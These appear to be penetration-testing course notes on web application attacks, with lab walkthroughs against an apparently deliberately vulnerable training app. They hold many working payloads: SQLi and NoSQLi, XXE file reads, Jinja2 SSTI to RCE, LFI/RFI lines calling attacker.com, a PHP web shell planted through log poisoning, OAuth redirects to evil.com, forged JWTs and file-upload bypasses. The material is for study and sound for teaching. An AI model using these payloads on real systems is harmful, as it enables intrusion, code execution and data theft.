
# Module1

## Web Application Core Components

|Component|Function|
|---|---|
|Web Server|Accepts user requests, directs to correct destination|
|Application Server|Handles processing tasks, delivers responses|
|Database|Stores, retrieves, organizes application data|

## Web Application Architecture Layers

|Layer|Components|
|---|---|
|Presentation Layer|Web Server|
|Business Layer|API Layer (Web Services API), App (Business Logic), Back End (Legacy Application, Enterprise Information System)|
|Data Layer|Database Service, Third Party Service|

## OWASP Resources

| Resource     | Description                                                                                          |
| ------------ | ---------------------------------------------------------------------------------------------------- |
| OWASP Top 10 | Top 10 most exploited vulnerabilities (Web Apps, API, LLM, CI/CD) - Release cycle: every 4 years     |
| WSTG         | Web Security Testing Guide - methodologies, techniques, checklists for web app vulnerability testing |


# Module2

## Burp Suite

**Developer:** PortSwigger

**Core Tools:**

|Tool|Function|
|---|---|
|Proxy|Intercepts requests, forwards to destination server. Inspect & modify HTTP(S) traffic|
|Intruder|Automated requests with customizable payloads. Used for SQLi testing, brute-forcing credentials|
|Repeater|Manually modify & resend HTTP/WebSocket requests repeatedly. Test different input values|
|Scanner|Automated vulnerability scanning (Pro)|
|Collaborator|Out-of-band interaction detection (Pro)|
|Extender|Add extensions/plugins|

## Nuclei

**Developer:** ProjectDiscovery

**Type:** Fast, community-driven vulnerability scanner using YAML-based DSL

**Scan Targets:** Applications, APIs, Networks, DNS, Cloud

**Nuclei Templates:**

- YAML-based vulnerability detection scripts
- Contain logic to detect security vulnerabilities
- Several thousand community-contributed templates available

# Module 3

## OSINT (Open Source Intelligence)

**Definition:** Extracting actionable intel from publicly available sources via passive means

**Sources:** Online & Offline

**Use Cases:** Reconnaissance, Attack Planning, Compatibility Checks

**Goal:** Identify technologies, versions, and configurations of targets

# Module 4
## OSINT Techniques

### DNS (Domain Name System)

- Maps IP addresses to domains and vice versa
- Provides critical insights into client's attack surface
- **Tool:** DNSDumpster

### Subdomain Enumeration

- Used for integrating third-party services
- Provides additional targets
- Orphaned subdomains often found in the wild
- Often act as initial entry point into client's infrastructure
- **Tool:** Crt.sh (Certificate Transparency logs)

### WHOIS

- Query-Response protocol
- Lookups: Domain names, IP addresses, ASNs
- Provides: Ownership and registration data
- **Tool:** Whois.com

### Google Dorking

- Extract information using Google's search operators
- Simple to complex piped (|) queries
- **Resource:** Google Hacking Database (GHDB)

**Example Dorks:**

```
inurl:/wp-content/uploads/ ext:txt "username" | "user name" | "uname"
intitle:"Index of" inurl:/backup/ "admin.zip"
```

## OSINT Resources

|Technique|Tool/Resource|
|---|---|
|DNS Recon|DNSDumpster|
|Subdomain|Crt.sh|
|WHOIS|Whois.com|
|Google Dorking|Google Hacking Database (GHDB)|

## FFUF (Fuzz Faster U Fool)

**Purpose:** Fast discovery of hidden resources

**Capabilities:**

- High-speed directory and file fuzzing using wordlists
- Fuzzing parameters
- Fuzzing headers
- Fuzzing POST data

# Module 5

## WAF (Web Application Firewall)

**Definition:** Application-level firewall that monitors, filters, and blocks HTTP(S) traffic to and from a web service

**Purpose:** Blocking malicious payloads by threat actors

## WAF Bypass Techniques

|Technique|Description|
|---|---|
|Regex Bypass|Craft alternative syntax to evade regex patterns|
|URL Encoding|`<script>` → `%3Cscript%3E`|
|Double Encoding|`<` → `%253C`|
|Wildcard Obfuscation|Use wildcards in payloads|
|Mixed Encoding|Combine different encoding methods|
|Case Changing|`<ScRiPt>`, `SeLeCt`, `UniOn`|
|Content-Type Manipulation|Change Content-Type header, add different character sets|
|Header Modification|Modify HTTP headers to bypass rules|

# Module 6
## SQL 101

**Definition:** Structured Query Language - standardized language for relational databases

**Examples:** MySQL, MS-SQL, PostgreSQL

### SQL Components

|Component|Description|
|---|---|
|Tables|Organizes data into rows (records) and columns (attributes)|
|Statements|Commands that RDBMS understand and execute|
|Stored Procedures|Predefined collection of SQL statements saved in database|

### SQL Clauses

|Clause|Function|
|---|---|
|WHERE|Filter records|
|ORDER BY|Sort results|
|GROUP BY|Aggregate rows|
|HAVING|Apply conditions on groups|
|LIMIT|Restrict number of results|

### SQL Operators

**Comparison:** `=`, `!=`, `<>`, `>`, `<`, `>=`, `<=`

**Logical:** `AND`, `OR`, `NOT`

**Other:** `IN`, `BETWEEN`, `LIKE`, `IS NULL`, `IS NOT NULL`

### CRUD Operations

```
-- CREATE (INSERT)
INSERT INTO Products (ProductID, ProductName, Price) VALUES (1001, 'Mattress', 499);

-- READ (SELECT)
SELECT * FROM Products;
SELECT ProductName, Price FROM Products;
SELECT * FROM Products WHERE Price > 300;

-- UPDATE
UPDATE Products SET Price = 599 WHERE ProductID = 1001;

-- DELETE
DELETE FROM Products WHERE ProductID = 1001;
```

## SQL Injection (SQLi)

**Definition:** User-supplied input improperly incorporated into database queries, allowing manipulation of SQL statements

### Types of SQLi

|Type|Subtype|Description|Payload Example|
|---|---|---|---|
|In-Band|Error-Based|Forces verbose error messages revealing DB details|`' OR 1=1--`|
|In-Band|Union-Based|Uses UNION to extract additional data|`' UNION SELECT username, password FROM users--`|
|Blind|Boolean-Based|Infers data from true/false response differences|`' AND 1=1--` (true) / `' AND 1=2--` (false)|
|Blind|Time-Based|Uses time delays to infer data|`' OR IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--`|

## XXE (XML External Entity) Injection

**Definition:** Occurs when application improperly processes XML input containing external entity references

### Types of XXE

**Classic XXE:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

**Error-Based XXE:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///nonexistentfile">
]>
<user>
  <name>&xxe;</name>
</user>
```

**Blind XXE (OOB):**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "https://webhook.site/<UUID>">
]>
<user>
  <name>&xxe;</name>
</user>
```

## OS Command Injection

|Type|Description|Example|
|---|---|---|
|OS Command Injection|Commands executed in OS context|`whoami`, `printenv`|
|Component Command Injection|Commands executed in protocol/interpreter context|`python3 revshell.py`|

## SSTI (Server-Side Template Injection)

**Definition:** User-supplied input unsafely integrated into server-side template, allowing injection of arbitrary template expressions.

## NoSQL Injection

**Definition:** Untrusted user-input inserted into NoSQL queries, manipulating database operations

**Common Target:** JSON-based applications (e.g., MongoDB in MEAN stack)

**Impact:** Authentication bypass, data exfiltration

### Payloads

```json
// Boolean-Based
{ "owner": { "$ne": "" } }

// Error-Based
{ "owner": { "$abcd": "123" } }
```

## SQL Injection Payloads

### In-Band SQLi - Authentication Bypass

json

```json
{"username": "admin' --", "password": "anything"}
```

### Error-Based SQLi - Column Enumeration

json

```json
{"username": "admin' OR 1=1 ORDER BY 100--", "password": "anything"}
```

### Boolean-Based Blind SQLi

json

```json
// True condition (auth succeeds)
{"username": "admin' AND 1=1--", "password": "anything"}

// False condition (auth fails)
{"username": "admin' AND 1=2--", "password": "anything"}
```

### Time-Based Blind SQLi (PostgreSQL)

json

```json
{"username": "admin' OR 1=1; SELECT pg_sleep(5)--", "password": "anything"}
```

### Union-Based SQLi - Column Count

json

```json
// Increment NULLs until no error
{"username": "admin' UNION SELECT NULL,NULL,NULL,NULL--", "password": "anything"}

// 8 columns found
{"username": "admin' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "password": "anything"}
```

---

## XXE Injection Payloads

### Classic XXE - File Read

xml

```xml
<?xml version="1.0"?>
<!DOCTYPE statement [
<!ENTITY account SYSTEM "file:///etc/passwd">
]>
<statement>
<customer>John Doe</customer>
<account>&account;</account>
</statement>
```

### Error-Based XXE

xml

````xml
<?xml version="1.0"?>
<!DOCTYPE statement [
 <!ENTITY boom SYSTEM "file:///root/secret_file">
]>
<statement>
 <customer>Jane Smith</customer>
 <account>&boom;</account>
</statement>
```

---

## Command Injection Payloads

**Test Payloads:**
```
ls
id
whoami
````

---

## SSTI Payloads

### Detection

json

````json
{"to_account":"as", "amount":"1", "description":"{{7*7}}"}
```

*Check if `49` appears in response*

### File Read (Jinja2/Flask)
```
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
````

---

## NoSQL Injection Payloads

### Boolean-Based (Operator Injection)

json

```json
{ "owner": { "$ne": "" } }
```

### Regex-Based (Wildcard)

json

```json
{ "owner": { "$regex": ".*" } }
```

### OR-Based (Always True)

json

```json
{
 "$or": [
   { "owner": "admin" },
   { "owner": { "$ne": "admin" } }
 ]
}
```

### Error-Based (Invalid Operator)

json

```json
{ "owner": { "$abcd": "123" } }
```

---

## GraphQL Injection Payloads

### Error-Based

json

```json
{"query":"{ user(username:\"qwe'\") { id username balance } }"}
```

### Boolean-Based

json

```json
// True condition
{"query":"{ user(username:\"test' AND '2'='2\") { id username balance } }"}

// False condition
{"query":"{ user(username:\"test' AND '2'='1\") { id username balance } }"}
```

### Introspection (Schema Dump)

json

```json
{"query":"{ __schema { types { name fields { name } } } }"}
```

### Unauthorized Access

json

```json
{"query":"{ user(username:\"admin\") { id username balance } }"}
```

# Module 7
## Authentication vs Authorization

|Concept|Definition|
|---|---|
|Authentication (AuthN)|Process of verifying the identity of a user|
|Authorization (AuthZ)|Process of verifying whether the authenticated user has privileges for certain operations|

## Brute Force Attacks

**Definition:** Manual/automated guessing of credentials or tokens

**Targets:** Login forms, API auth endpoints, Password reset flows

### Types of Brute Force Attacks
Simple Brute Force, Dictionary Attack, Credential Stuffing, Reverse Brute Force, Hybrid Brute Force

## Session Management

**Definition:** Web applications manage persistent user interactions & associated privileges using sessions

**Handled via:** Cookies, JWT tokens

### Session Management Components
Session ID Generation, Session Storage, Session Transmission, Session Expiration, Session Termination

### Broken Session Attacks

| Attack              | Description                                                              |
| ------------------- | ------------------------------------------------------------------------ |
| Session Hijacking   | Attacker takes over a valid user session to act as that user             |
| Session Fixation    | Attacker sets/supplies a session ID that victim later authenticates with |
| Cookie Manipulation | Attacker manipulates session cookies to impersonate another session      |

## IDOR (Insecure Direct Object Reference)

**Definition:** Vulnerability where applications authorize access using user-supplied identifiers without proper validation

**Impact:** Data exposure, Privilege escalation

### Types of IDOR

|Type|Description|Example|
|---|---|---|
|Horizontal IDOR|Access another user's data (same privilege level)|`user_id=1001` → `user_id=1002`|
|Vertical IDOR|Gain higher-level access (crosses privilege boundaries)|`role=user` → `role=admin`|

## OAuth (Open Authorization)

**Definition:** Standard protocol that lets users grant third-party apps controlled access to their resources without exposing passwords

**Features:**

- Grants limited access to resources
- Can be revoked easily

### OAuth Flow
User requests access -> Application redirects to Authorization Server -> User authenticates & grants permission -> Authorization Server returns authorization code -> Application exchanges code for access token -> Application uses token to access resources

## JWT (JSON Web Tokens)

**Definition:** Compact, self-contained token format for exchanging claims between parties

**Features:**
Lightweight, Can be sent in headers, URLs, or requests, Contains all info needed to verify user without database lookup

### JWT Structure

```
HEADER.PAYLOAD.SIGNATURE
```

|Part|Content|
|---|---|
|Header|Algorithm & token type (`{"alg":"HS256","typ":"JWT"}`)|
|Payload|Claims (user data, expiration, etc.)|
|Signature|Verification signature|

### JWT Flow
Client sends credentials -> Server validates & generates JWT -> Server returns JWT to client -> Client stores JWT -> Client sends JWT with subsequent requests -> Server validates JWT signature & processes request


# Module 8
## Insecure Deserialization

### Serialization vs Deserialization

|Process|Description|
|---|---|
|Serialization|Object → Stream of Bytes (for storage/transmission)|
|Deserialization|Stream of Bytes → Object (reconstruction)|

**Storage:** File, DB, Memory, Socket

### Insecure Deserialization

**Definition:** Application deserializes user-supplied data without validation

**Impact:** Code execution, Data corruption, Privilege escalation

### Attack Flow

**Safe Flow:**

```
Client: {"class":"UserPrefs","theme":"dark","lang":"en"}
  → Server: deserialize(payload) → instantiate UserPrefs → apply settings
```

**Attack Scenario (Object Injection):**

```
Attacker: {"class":"ExploitGadget","cmd":"rm -rf /tmp/flag"}
  → Server: deserialize(payload) → instantiate ExploitGadget → gadget.run() (side-effect)
```

_Attack executes during deserialization, before application-level checks_

---

## SSRF (Server-Side Request Forgery)

**Definition:** Application fetches user-supplied URL, allowing attacker to trick server into making unintended requests

**Impact:** Access internal-only resources (cloud metadata endpoints, internal APIs, localhost services)

### Common SSRF Targets

```
http://127.0.0.1/admin
http://localhost/admin
http://169.254.169.254/latest/meta-data/  (AWS metadata)
http://[::1]/admin  (IPv6 localhost)
```

---

## File Inclusion

**Definition:** Application loads file path from user input and includes/executes that file on server

**Impact:** RCE, Sensitive info disclosure, Persistence

### Types of File Inclusion

|Type|Description|Source|
|---|---|---|
|LFI (Local File Inclusion)|Loads and executes files from server's local filesystem|Server|
|RFI (Remote File Inclusion)|Loads and executes file from external attacker-controlled source|External|

### Common LFI Payloads

```
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=/etc/passwd%00
?page=php://filter/convert.base64-encode/resource=index.php
```

### RFI Payloads

```
?page=http://attacker.com/shell.txt
?page=http://attacker.com/shell.txt%00
```

---

## Path Traversal

**Definition:** Application improperly fetches and processes arbitrary files, returns contents to frontend

**Impact:** Disclosure of configuration files, source code, credentials

### Path Traversal Payloads

```
../../../etc/passwd
..\..\..\..\windows\system32\config\sam
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

**Example:**

```
Normal:  /loadImage?filename=gift.png
Attack:  /loadImage?filename=../../../etc/passwd
```

---

## Prototype Pollution

**Definition:** JavaScript vulnerability where attacker can modify the prototype of a base object (Object.prototype)

**Impact:** Injected properties become visible on all objects, changing application behavior globally

### Attack Vector

javascript

````javascript
// Attacker input
{"__proto__": {"isAdmin": true}}

// OR via URL
?__proto__[isAdmin]=true
```

### Attack Flow
```
Attacker input: __proto__.transport_url=evil-user.net
  → recursiveMerge() processes input
  → Object.prototype.transport_url = 'evil-user.net'
  → All objects inherit this property
````

### Common Payloads

json

````json
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
```

---

## File Upload Bypass

**Definition:** Application's file upload filtering/validation is circumvented

**Impact:** Upload executable code, web shells, malicious files

### Bypass Techniques

| Technique | Example |
|-----------|---------|
| Double extension | `shell.php.png` → server strips `.png` → `shell.php` |
| Null byte | `shell.php%00.png` |
| Case manipulation | `shell.PhP` |
| Content-Type manipulation | Change `application/x-php` → `image/png` |
| Magic bytes | Add PNG header (`\x89PNG`) to PHP file |
| Alternative extensions | `.php5`, `.phtml`, `.phar`, `.inc` |

### Upload Bypass Flow
```
1. Upload: backdoor.php.png
2. Server validation: sees .png → allows
3. Server processing: strips extension or uses first extension
4. Result: backdoor.php executed
```

### Common Dangerous Extensions
```
PHP: .php, .php5, .phtml, .phar
ASP: .asp, .aspx
JSP: .jsp, .jspx
Other: .cgi, .pl, .py
````

# Module 9

## Chained Attacks Overview

Chained attacks combine multiple vulnerabilities to escalate impact. Understanding attack chains is critical for both exploitation and defense.

### Chain 1: LFI → Log Poisoning → RCE

**Attack Flow:**

```
Web Application → Local File Read (LFI) → Log Poisoning → RCE
```

**Steps:**

1. Identify LFI vulnerability (e.g., `?page=../../../etc/passwd`)
2. Confirm ability to read log files (Apache/Nginx access logs)
3. Inject PHP payload into log via User-Agent or other logged field
4. Include the poisoned log file via LFI to execute payload

**Common Log Paths:**

```
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/httpd/access_log
/proc/self/environ
```

**Log Poisoning Payload (User-Agent):**

```
User-Agent: <?php system($_GET['cmd']); ?>
```

**Trigger RCE:**

```
?page=../../../var/log/apache2/access.log&cmd=id
```

### Chain 2: SQL Injection → XXE → RCE

**Attack Flow:**

```
SQL Injection → Admin Access → XXE Injection → SQL Injection → RCE
```

**Steps:**

1. Exploit SQLi to bypass authentication or extract admin credentials
2. Access admin panel/functionality
3. Find XML processing feature in admin area
4. Exploit XXE to read sensitive files or chain to further SQLi
5. Achieve RCE through file write or additional exploitation

### Chain 3: JWT KID Header Injection → SSRF

**Attack Flow:**

```
Web Application → JWT Token (KID parameter) → SSRF
```

**Concept:**

- JWT `kid` (Key ID) header specifies which key to use for signature verification
- If application fetches key from URL based on `kid` value, attacker can inject arbitrary URLs

**Malicious JWT Header:**

````json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "http://internal-server/admin"
}
```

**SSRF Targets:**
```
http://169.254.169.254/latest/meta-data/  (AWS)
http://localhost/admin
http://internal-api/sensitive-endpoint
```

---

### Chain 4: Broken Session Management → SSTI → RCE

**Attack Flow:**
```
Web Application → Broken Session (JWT) → SSTI → RCE
```

**Steps:**
1. Exploit broken JWT validation (signature bypass, algorithm confusion)
2. Gain elevated privileges or access restricted functionality
3. Find template injection point
4. Exploit SSTI for RCE

**SSTI Detection:**
```
{{7*7}} → 49
${7*7} → 49
<%= 7*7 %> → 49
````

**SSTI to RCE (Jinja2):**

````python
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

---

### Chain 5: OAuth Misconfiguration → XXE → RCE

**Attack Flow:**
```
OAuth Scope Upgrade → Admin Access → XXE Injection → Access Config.txt → Machine Keys → Insecure Deserialization → RCE
```

**Steps:**
1. Manipulate OAuth scope (`scope=read` → `scope=admin`)
2. Gain admin access
3. Exploit XXE in admin functionality to read config files
4. Extract machine keys/secrets from config
5. Use keys for insecure deserialization attack
6. Achieve RCE

**OAuth Scope Manipulation:**
```
/authorize_callback?authorization_code=xxx&scope=read
                                              ↓
/authorize_callback?authorization_code=xxx&scope=admin
````

---

## Chained Attack Patterns Summary

|Chain|Entry Point|Pivot|Final Impact|
|---|---|---|---|
|LFI → Log Poisoning → RCE|File Inclusion|Log Files|Code Execution|
|SQLi → XXE → RCE|Database|XML Parser|Code Execution|
|JWT KID → SSRF|Token Header|Key Fetch|Internal Access|
|Broken Session → SSTI → RCE|Authentication|Template Engine|Code Execution|
|OAuth → XXE → Deser → RCE|Authorization|Config Leak|Code Execution|

# Lab

## Brute Force Attack - PIN Reset

**Vulnerable Endpoint:** `/reset-password`

**Attack Flow:**

1. Register new user / target existing user
2. Use "Forgot Password" feature
3. Intercept PIN reset request with Burp Suite
4. Send to Intruder
5. Set PIN field as payload position (`Add §` button)
6. Payload type: Numbers (e.g., 100-999 for 3-digit PIN)
7. Start attack
8. Identify correct PIN by different response length

## Broken Object Level Authorization (BOLA)

**Vulnerable Endpoint:** `/api/virtual-cards`

**Attack Flow:**

1. Login as User A (Alice) → Note JWT token
2. Login as User B (Bob) → Capture requests
3. Replace Bob's token with Alice's token
4. Access Alice's resources with Bob's session

## IDOR Attacks

### IDOR - Transaction Info

**Vulnerable Endpoint:** `/transactions/<account_number>`

**Attack:**

```
GET /transactions/5458378513  →  GET /transactions/<victim_account>
```

_Change account number to access other users' transactions_

### IDOR - Freeze Card

**Vulnerable Endpoint:** `/api/virtual-cards/<card_id>/toggle-freeze`

**Attack:**

```
POST /api/virtual-cards/9/toggle-freeze  →  /api/virtual-cards/<victim_card_id>/toggle-freeze
```

_Change virtual card ID to freeze any user's card_

## OAuth Attacks

### Redirect URL Manipulation

**Vulnerable Endpoint:** `/authorize`

**Attack Flow:**

1. Login and intercept request before clicking "Agree"
2. Forward until `/authorize` endpoint
3. Change `redirect_url` parameter to attacker-controlled domain (e.g., `evil.com`)
4. Authorization code sent to attacker's server

**Payload:**

```
redirect_url=https://evil.com
```

### Scope Upgrade

**Vulnerable Endpoint:** `/authorize_callback`

**Attack:**

```
/authorize_callback?authorization_code=xxx&client_id_param=client_3424&scope=read

/authorize_callback?authorization_code=xxx&client_id_param=client_3424&scope=admin
```

_Change `scope=read` to `scope=admin` to gain admin access_

## JWT Attacks

### Signature Bypass / Privilege Escalation

**Vulnerability:** Application accepts JWT without validating signature

**Attack Flow:**

1. Login as normal user
2. Capture request with JWT token
3. Decode JWT at jwt.io
4. Modify payload: `"is_admin": false` → `"is_admin": true`
5. Replace original token with modified token (can omit signature)
6. Refresh page → Admin access granted

**JWT Modification:**

```json
// Original
{"user_id":33,"username":"user","is_admin":false}

// Modified
{"user_id":33,"username":"user","is_admin":true}
```

---

## Chain 1: LFI → Log Poisoning → RCE (Lab)

**Vulnerable Endpoint:** `/blog_page/index.php?search=`

### Step 1: Confirm LFI

```
http://<IP>:PORT/blog_page/index.php?search=..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

### Step 2: Poison Logs via User-Agent

bash

````bash
# Linux
curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>:PORT/

# PowerShell
curl.exe -H "User-Agent: <?php system(`$_GET['cmd']); ?>" http://<IP>:PORT
```

### Step 3: Access Poisoned Log
```
http://<IP>:PORT/blog_page/index.php?search=logs%2Faccess.log
```

### Step 4: Execute Commands
```
http://<IP>:PORT/blog_page/index.php?search=logs%2Faccess.log&cmd=id
```

**Result:** RCE achieved

---

## Chain 2: SQLi → XXE → Local File Read (Lab)

### Step 1: SQLi Authentication Bypass
```
Username: Admin' --
Password: anything
````

_Grants admin access_

### Step 2: XXE in Add Product (XML input)

**Test Payload:**

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
</userInfo>
```

### Step 3: File Read Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<product>
  <name>&xxe;</name>
  <description>Test</description>
</product>
```

### Step 4: Extract via SQLi

```sql
' UNION SELECT product, name FROM items WHERE id=1 --
```

_Increment `id` to find uploaded product with XXE output_

**Result:** Local file read achieved

---

## Chain 3: JWT KID Header Injection → SSRF (Lab)

### Step 1: Capture JWT Token

Login and intercept requests in Burp Suite

### Step 2: Decode JWT (jwt.io)

Identify `kid` parameter in header:

json

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key-id-value"
}
```

### Step 3: SSRF via KID Parameter

Replace `kid` with webhook/attacker URL:

json

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "https://webhook.site/xxxxx"
}
```

### Step 4: Send Modified Token

Replace JWT in request → Response: "Request Completed with unknown kid"

**Webhook receives GET request → SSRF confirmed**

---

## Chain 4: Broken Session (JWT) → SSTI → RCE (Lab)

**Credentials:** `user:password`

### Step 1: Capture & Decode JWT

json

```json
{
  "user": "user",
  "role": "user"
}
```

### Step 2: Modify Role

json

````json
{
  "user": "user",
  "role": "admin"
}
```

### Step 3: Replace Token
DevTools → Storage → Cookies → Replace JWT value

### Step 4: Access Admin Panel
Refresh page → Admin access granted → Find "Custom Statement Render"

### Step 5: SSTI Detection
```
{{7*7}}
````

_Output: 49 → SSTI confirmed_

### Step 6: SSTI to File Read (Jinja2)

python

```python
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

**Result:** RCE achieved

---

## Quick Reference - Chained Attack Payloads

|Chain|Key Payloads|
|---|---|
|LFI → Log Poison → RCE|`curl -A "<?php system(\$_GET['cmd']); ?>"` then `?search=logs/access.log&cmd=id`|
|SQLi → XXE → File Read|`Admin' --` then `<!ENTITY xxe SYSTEM "file:///etc/passwd">` then `' UNION SELECT product, name FROM items WHERE id=1 --`|
|JWT KID → SSRF|Modify `kid` header to `http://attacker.com`|
|JWT Role → SSTI → RCE|`"role":"admin"` then `{{7*7}}` then `{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}`|
